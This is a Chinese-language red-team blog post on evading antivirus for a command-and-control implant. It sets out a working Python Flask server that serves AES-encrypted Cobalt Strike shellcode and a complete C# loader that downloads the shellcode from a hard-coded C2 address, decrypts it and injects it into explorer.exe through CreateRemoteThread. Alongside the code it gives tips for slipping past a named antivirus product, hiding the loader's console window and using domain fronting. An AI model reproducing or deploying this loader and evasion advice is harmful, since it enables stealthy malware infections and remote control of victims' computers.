---
title: 【红队】权限维持之--C2免杀
---
# C&C免杀对抗多维度分析

**查杀方式**

> 文件查杀（Signatured Static Scanning）
> 内存扫描（Run-time Analysis）
> 流量分析（NIPS/NIDS）
> 行为分析（behavior Monitoring）

**对抗-静态扫描（文件查杀）**

1、shellcode加密（XOR、AES）

避免被杀软直接获取到真正shellcode（因为性能等原因 杀软不会暴力枚举解密内容）

2、源码级免杀（自主研发C&C工具）

**对抗-内存扫描**

各种语言自定义加载器，比如使用C# 编写ShellCode Loader

运行机制不同（C#使用虚拟机解释后运行，Golang编译运行）杀软没足够精力跟进各种形式的加载器

**对抗-流量分析**

域前置 - Domain Fronting

 流量路径`CDN->IP->c2`

**对抗-行为分析**

指定特定的运行条件，符合条件才执行恶意操作；避免在沙箱、逆向分析时有明显的恶意行为。

适合指定某个重要目标的情况下使用，比如要拿域内的某台重要靶标。

或者可以加强壳，例如VMP

# 一、shellcode加密

推荐一个脚本：https://github.com/rvrsh3ll/CPLResourceRunner 

可以把CS生成的RAW的beacon.bin转成shellcode

```bash
python2 ConvertShellcode.py beacon.bin
```

**服务端：Python Flask动态加密Shellcode**

```python
#服务端起个Flask动态加密，__init__.py
#coding=utf-8
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from flask import Flask

def add_to_32(key):
    while len(key) % 32 != 0:
        key += '\0'
    return str.encode(key)  # 返回bytes,密钥不是32位就不全

def create_app():
    # create and configure the app
    app = Flask(__name__, instance_relative_config=True)
    @app.route('/<string:key>', methods=('GET', 'POST'))
    def AES_Encrypt(key):
        BLOCK_SIZE = 32  # Bytes
        f = open('./shellcode.txt', 'r')	#从CS导出的C#格式的shellcode，放在Fask应用根目录
        shellcode = f.read()
        cipher = AES.new(add_to_32(key), AES.MODE_ECB)
        encrypted = cipher.encrypt(pad(shellcode.encode('utf-8'),BLOCK_SIZE))
        encrypted_text = str(base64.encodebytes(encrypted), encoding='utf-8')
        #加密结果用base64编码
        return encrypted_text
    return app
```



# 二、C#编写Loader

**客户端：Loder从网络加载Shellcode（随机生成key去请求shellcode） -> 解密 -> 创建进程 运行上线**

```c#
//WLoader C#
using System;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Diagnostics;

namespace Wloader
{
    class Program
    {
        // Used to Load Shellcode into Memory:
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32.dll")] //声明API函数
        public static extern int VirtualAllocEx(
            IntPtr hProcess, //进程的句柄.该函数在此进程的虚拟地址空间内分配内存
            int lpAddress,//该指针为要分配的页面区域指定所需的起始地址
            UInt32 dwSize,//要分配的内存区域的大小，以字节为单位
            UInt32 flAllocationType,//内存分配的类型 ,MEM_COMMIT为指定的保留内存页面分配内存
            UInt32 flProtect);//对要分配的页面区域的内存保护,PAGE_EXECUTE_READWRITE
        //该地址必须是页面属性为PAGE_EXECUTE_READWRITE的页面）或者其他宿主进程能执行地方（如共享内存映射区）

        [DllImport("kernel32.dll")]
        public static extern int WriteProcessMemory(
            IntPtr hProcess,    //要修改的过程存储器的句柄
            int lpBaseAddress, //指向要写入数据的指定进程中的基地址的指针
            byte[] lpBuffer, //指向缓冲区的指针，该缓冲区包含要在指定进程的地址空间中写入的数据
            int nSize,//要写入指定进程的字节数 
            int lpNumberOfBytesWritten);//指向变量的指针，该变量接收传输到指定进程中的字节数;(可选)为NULL则忽略

        [DllImport("kernel32.dll")]
        public static extern int GetProcAddress(int hwnd, string lpname);

        [DllImport("kernel32.dll")]
        public static extern int GetModuleHandleA(string name);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,//目标进程的句柄
            UInt32 lpThreadAttributes, //指向线程的安全描述结构体的指针，一般设置为NULL，表示默认安全级别
            UInt32 dwStackSize,//线程堆栈大小，一般设置为0，表示使用默认大小
            UInt32 lpStartAddress,//线程函数的地址
            IntPtr lpParameter,//线程参数
            UInt32 dwCreationFlags,//线程的创建方式，CREATE_SUSPENDED 线程以挂起方式创建
            ref UInt32 lpThreadId); //输出参数，记录创建的远程线程的ID
        

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
          IntPtr hHandle,
          UInt32 dwMilliseconds
        );

        public static string key;



        //随机生成32位密钥
        public static void NewKey()
        {
            key = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 32);
        }
        //请求获取shellcode内容
        public static string GetShell(string url)
        {
            url = url + key;
            HttpWebRequest reqContent = (HttpWebRequest)WebRequest.Create(url);//这个是请求的登录接口
            reqContent.Method = "GET";
            reqContent.AllowAutoRedirect = true;//服务端重定向。一般设置false
            reqContent.Timeout = 5000;
            HttpWebResponse respContent = (HttpWebResponse)reqContent.GetResponse();
            StreamReader sr = new StreamReader(respContent.GetResponseStream());
            return sr.ReadToEnd();

        }

        //AES解密
        public static string AesDecrypt(string message, string key)
        {
            using (AesCryptoServiceProvider aesProvider = new AesCryptoServiceProvider())
            {
                aesProvider.Key = Encoding.UTF8.GetBytes(key);
                aesProvider.Mode = CipherMode.ECB;
                aesProvider.Padding = PaddingMode.None;
                using (ICryptoTransform cryptoTransform = aesProvider.CreateDecryptor())
                {
                    byte[] inputBuffers = Convert.FromBase64String(message);
                    byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
                    aesProvider.Clear();
                    string rs = Encoding.UTF8.GetString(results);
                    rs = rs.Replace("", null);
                    rs = rs.Replace("", null);
                    rs = rs.Replace(" ", null);
                    return rs;
                }
            }
        }
       
    public static void runShell(string shellcodes)
        {
            string[] strings = shellcodes.Split(',');
            byte[] shellcode = new byte[strings.Length];
            //逐个字符变为16进制字节数据
            for (int i = 0; i < strings.Length; i++)
            {
                shellcode[i] = Convert.ToByte(strings[i], 16);
            }
            Console.WriteLine(strings.Length);
            try
            {

                Process[] pname = Process.GetProcesses(); //取得所有进程
                foreach (Process name in pname)
                {
                    if (name.ProcessName.ToLower().IndexOf("explorer") != -1)//注入到资源管理器中
                    {
                        IntPtr hThread = IntPtr.Zero;
                        UInt32 threadId = 0;
                        IntPtr pinfo = IntPtr.Zero;

                        UInt32 funcAddr = (uint)VirtualAllocEx(name.Handle, 0, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                        //在宿主进程中申请一块存储区域

                        WriteProcessMemory(name.Handle, (int)funcAddr, shellcode, shellcode.Length, 0);
                        //通过WriteProcessMemory函数将线程代码写入宿主进程中（替换上边的）

                        /*threadId = GetProcAddress(GetModuleHandleA("Kernel32"), "LoadLibraryA");*/
                        //取得loadlibrary在kernek32.dll地址

                        hThread = CreateRemoteThread(name.Handle, 0, 0, funcAddr, pinfo, 0, ref threadId);
                        WaitForSingleObject(hThread, 0xFFFFFFFF);
                        Console.WriteLine("执行完毕，Success");
                    }
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("exception: " + e.Message);
            }
        }
        static void Main(string[] args)
        {
            NewKey();//生成32位的密钥key
            string shellcode = GetShell("http://192.168.1.103:5000/");//从HTTP服务器获取加密的Shellcode
            shellcode = AesDecrypt(shellcode, key);//这里就得到了动态加解密后的shellcode
            //Console.WriteLine(shellcode);//输出测试

            //接下来注入到进程
            runShell(shellcode);
        }
    }
}

```

**成功上线**

![](/images/ss.png)

**杀软扫描**

![](/images/image-20200725203712920.png)

![](/images/image-20200725204100044.png)

![](/images/image-20200725204247935.png)

**最后注意！！！**

我写代码的时候机器开着火绒呢，一开始我用的CreateThread直接给我干掉了;

后来改成CreateRemoteThread，火绒还是能识别出木马释放程序；

解决方法：1、再找其它可以替代的函数； 2、寻找新的注入方式

还有就是我这次做实验的时候太奔放了，全程开着杀软网没断；

正确的做法是更新完杀软然后断网，创建虚拟机快照，测完后恢复快照；

否则杀软会镜像流量，等下次开机样本就会被上传出去。

> 这个加载器运行时会弹一个黑框输出shellcode的长度，实际使用记得修改为不让它弹窗

# 三、使用域前置

由于是测试，跳过了这一步，直接用了C2的IP

域前置方法参考以下链接：

https://www.anquanke.com/post/id/195011 

> 另外CS的Profie也要自己修改一下特征